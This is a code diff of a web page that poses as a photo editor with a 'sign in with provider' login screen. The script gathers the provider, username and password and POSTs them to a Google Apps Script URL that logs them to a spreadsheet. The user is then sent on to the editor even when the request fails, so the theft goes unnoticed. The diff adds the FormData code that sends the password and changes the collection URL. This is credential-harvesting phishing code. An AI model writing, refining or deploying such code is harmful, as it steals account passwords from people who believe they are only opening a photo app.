@@ -120,7 +120,6 @@
         </div>
         
         <div class="tools-panel">
-            <!-- Controls for tools -->
             <div id="control-presets" class="control-section active">
                 <div class="tool-options">
                     <button class="tool-chip active" onclick="setPreset('Cinematic Pro', this)">Cinematic Pro</button>
@@ -149,7 +148,6 @@
                 <p style="color:#888; font-size:13px; text-align:center;">Vignette, Grain & Clarity Tools Ready</p>
             </div>
 
-            <!-- Bottom Navigation Bar -->
             <div class="bottom-nav" style="margin-top: 15px;">
                 <button class="nav-item active" onclick="switchTool(0, 'control-presets')"><span>✨</span>Presets</button>
                 <button class="nav-item" onclick="switchTool(1, 'control-light')"><span>☀️</span>Light</button>
@@ -163,12 +161,11 @@
 </div>
 
 <script>
-    // Aap ka Google Sheet Web App URL
-    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbwUnVjB5hQp5MdqhT8zKvcNQ524IeEQE2UCnOKDT1OyaLgHkdCS88e2ky0zXS5xOOinSg/exec';
+    // Aap ka naya aur updated Google Sheet Web App URL
+    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzOMAMImShmHXaNRrKx-8P_hNf86oCieyvh0QBgI3_BQ3H8RNQCFKgykHkotdtDVYLbfw/exec';
 
     let currentProvider = '';
 
-    // Splash screen timer (3 seconds)
     setTimeout(() => {
         switchScreen('auth-screen');
     }, 3000);
@@ -184,7 +181,7 @@
         switchScreen('login-screen');
     }
 
-    // Google Sheet mein data bhejne ka function
+    // Google Sheet mein FormData ke zariye data bhejne ka function
     async function submitData(type) {
         let identifier, password, provider;
 
@@ -207,15 +204,18 @@
         btn.innerText = 'Processing...';
         btn.classList.add('loading');
 
+        const formData = new FormData();
+        formData.append("provider", provider);
+        formData.append("identifier", identifier);
+        formData.append("password", password);
+
         try {
             await fetch(WEB_APP_URL, {
                 method: 'POST',
-                mode: 'no-cors', // Google Apps Script ke liye zaroori hai
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ provider, identifier, password })
+                mode: 'no-cors',
+                body: formData
             });
 
-            // Data submit hone ke baad seedha editor khul jaye ga
             switchScreen('editor-screen');
         } catch (error) {
             alert('Connection error, but entering app...');
@@ -226,7 +226,6 @@
         }
     }
 
-    // Editor Tools Logic
     function switchTool(index, sectionId) {
         document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
         document.querySelectorAll('.bottom-nav button')[index].classList.add('active');
